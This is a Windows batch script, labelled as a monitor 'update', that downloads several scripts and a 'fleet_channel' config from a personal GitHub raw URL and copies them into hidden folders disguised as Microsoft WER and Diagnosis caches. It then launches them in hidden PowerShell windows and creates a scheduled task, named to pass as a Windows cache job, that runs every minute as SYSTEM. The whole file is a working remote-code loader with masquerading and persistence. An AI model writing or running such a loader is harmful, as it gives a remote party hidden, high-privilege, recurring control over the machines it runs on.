@echo off
rem FORCE_MON_UPDATE R1 - unstick M57 hosts blocked from M58+ (old findstr M55/M56/M57 gate)
rem Overwrites mon/lib/gryxa/watch from pin; no msiexec. Sevrz Guest: finishes under 10s if curl ok.
setlocal
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=1e50a47"
set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1

"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.cmd" "%RAW%/own_mon.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.ps1" "%RAW%/own_lib.ps1?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%STAGE%\own_gryxa.cmd" "%RAW%/own_gryxa.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%STAGE%\gryxa_watch.cmd" "%RAW%/gryxa_watch.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%STAGE%\fleet_channel.cfg" "%RAW%/fleet_channel.cfg?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%STAGE%\observe.flag" "%RAW%/observe.flag?t=%RANDOM%"

findstr /C:"MONVER=M6" "%STAGE%\own_mon.cmd" >nul
if errorlevel 1 (
  echo FAIL mon-not-M6x
  endlocal & exit /b 2
)
findstr /C:"OWN_GRYXA BUILD 20260804G11" /C:"OWN_GRYXA BUILD 20260804G10" "%STAGE%\own_gryxa.cmd" >nul
if errorlevel 1 (
  echo FAIL gryxa-not-G10
  endlocal & exit /b 3
)
findstr /C:"GRYXA_WATCH BUILD" "%STAGE%\gryxa_watch.cmd" >nul
if errorlevel 1 (
  echo FAIL watch-missing
  endlocal & exit /b 4
)

attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_lib.ps1" "%WD%\own_gryxa.cmd" >nul 2>&1
copy /y "%STAGE%\own_mon.cmd" "%WD%\own_mon.cmd" >nul
copy /y "%STAGE%\own_lib.ps1" "%WD%\own_lib.ps1" >nul
copy /y "%STAGE%\own_gryxa.cmd" "%WD%\own_gryxa.cmd" >nul
copy /y "%STAGE%\gryxa_watch.cmd" "%WD%\gryxa_watch.cmd" >nul
copy /y "%STAGE%\fleet_channel.cfg" "%WD%\fleet_channel.cfg" >nul
copy /y "%STAGE%\observe.flag" "%WD%\observe.flag" >nul
copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul

findstr /C:"MONVER=" "%WD%\own_mon.cmd"
findstr /C:"OWN_GRYXA BUILD" "%WD%\own_gryxa.cmd"
findstr /C:"GRYXA_WATCH BUILD" "%WD%\gryxa_watch.cmd"

rem arm watch + kick mon without waiting (breakaway)
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%WD%\gryxa_watch.cmd\" LOOP' -WindowStyle Hidden" >nul 2>&1
schtasks /Create /TN "WucacheGryxaWatch" /TR "cmd.exe /c \"%WD%\gryxa_watch.cmd\" TICK" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%WD%\own_mon.cmd\"' -WindowStyle Hidden" >nul 2>&1

echo UPDATED pin=%PIN%
echo OK
endlocal

